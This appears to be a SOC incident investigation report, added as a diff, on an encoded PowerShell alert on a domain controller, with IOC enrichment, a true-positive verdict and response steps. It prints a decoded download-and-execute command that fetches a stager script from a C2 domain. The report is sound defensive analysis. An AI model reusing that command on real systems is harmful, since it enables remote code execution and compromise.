@@ -1,0 +1,86 @@
+## Investigation Summary
+
+### Alert Classification and Severity Assessment
+- **Alert Type:** High severity PowerShell-based defense evasion attack
+- **Risk Score:** 87/100 (High)
+- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+- **Target:** Domain Controller (DC01.corp.widgets-inc.com)
+
+### Decoded PowerShell Command Analysis
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+This is a classic malware dropper pattern attempting to download and execute a PowerShell script from a remote C2 server.
+
+### Indicators of Compromise (IOCs) and Enrichment Results
+
+#### 1. IP Address: 198.51.100.99
+**Risk Assessment: LOW**
+- **VirusTotal:** 0/94 engines flagged as malicious, marked as "harmless"
+- **AbuseIPDB:** Confidence score 0%, marked as reserved/test IP
+- **Analysis:** This is a TEST-NET-1 reserved IP address (RFC 5737) used for documentation and testing. While the IP itself is benign, its use in this context suggests this may be a test/simulation scenario.
+
+#### 2. Domain: c2-relay.darkops.net
+**Risk Assessment: HIGH**
+- **VirusTotal:** 0/94 engines flagged, but tagged as "dga" (Domain Generation Algorithm)
+- **WHOIS:** Registered 2013-11-28, expires 2024-11-28 (expired), uses privacy masking
+- **Registrar:** EurotrashNames.com LLC (suspicious registrar name)
+- **Analysis:** Highly suspicious domain name suggesting command-and-control infrastructure. The "darkops" name and "c2-relay" subdomain are clear indicators of malicious intent.
+
+#### 3. URL: https://c2-relay.darkops.net/stager.ps1
+**Risk Assessment: HIGH**
+- **VirusTotal:** URL not found in database (404 error)
+- **Analysis:** The URL path "/stager.ps1" is consistent with malware staging operations. The 404 suggests the payload may have been removed or the infrastructure taken down.
+
+#### 4. File Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c
+**Risk Assessment: LOW (Legitimate Binary)**
+- **VirusTotal:** 0/75 engines flagged as malicious
+- **File:** Legitimate Microsoft PowerShell.exe (Windows Server 10.0.20348)
+- **Signature:** Validly signed by Microsoft
+- **Analysis:** This is the legitimate PowerShell executable being abused by attackers (living-off-the-land technique).
+
+### Additional Context Indicators
+- **Source IP:** 10.0.1.10 (Internal network - Domain Controller)
+- **User Context:** NT AUTHORITY\SYSTEM (Highest privileges)
+- **Parent Process:** cmd.exe (Common attack vector)
+- **Execution Flags:** -NoProfile, -ExecutionPolicy Bypass, -WindowStyle Hidden (Classic evasion techniques)
+
+### Overall Verdict: **TRUE POSITIVE**
+
+This alert represents a legitimate security incident with the following evidence:
+1. **High-confidence malicious behavior:** Encoded PowerShell command designed to download and execute remote payload
+2. **Suspicious infrastructure:** Domain name clearly indicates C2 infrastructure
+3. **Critical target:** Attack occurred on domain controller with SYSTEM privileges
+4. **Classic attack patterns:** Use of execution policy bypass, hidden windows, and encoded commands
+5. **Living-off-the-land technique:** Abuse of legitimate PowerShell binary
+
+### Recommended Next Steps
+
+**IMMEDIATE (Priority 1):**
+1. **Isolate DC01** from the network to prevent lateral movement
+2. **Kill the PowerShell process** (PID 4128) if still running
+3. **Check for persistence mechanisms** on DC01
+4. **Review recent logons** and privileged account activity
+
+**SHORT-TERM (Priority 2):**
+1. **Hunt for similar PowerShell executions** across the environment
+2. **Block c2-relay.darkops.net** at DNS/firewall level
+3. **Scan DC01** with updated antimalware tools
+4. **Review Active Directory** for unauthorized changes
+5. **Check for data exfiltration** attempts
+
+**MEDIUM-TERM (Priority 3):**
+1. **Implement PowerShell logging** and monitoring
+2. **Deploy application whitelisting** to prevent unauthorized script execution
+3. **Review and harden** domain controller security configurations
+4. **Conduct threat hunting** for additional compromise indicators
+5. **Update incident response procedures** based on lessons learned
+
+**FORENSIC ANALYSIS:**
+1. **Memory dump** of DC01 before isolation
+2. **Disk imaging** for detailed forensic analysis
+3. **Network traffic analysis** for C2 communications
+4. **Timeline analysis** to determine initial compromise vector
+
+This incident requires immediate containment and thorough investigation due to the compromise of a critical domain controller with administrative privileges.
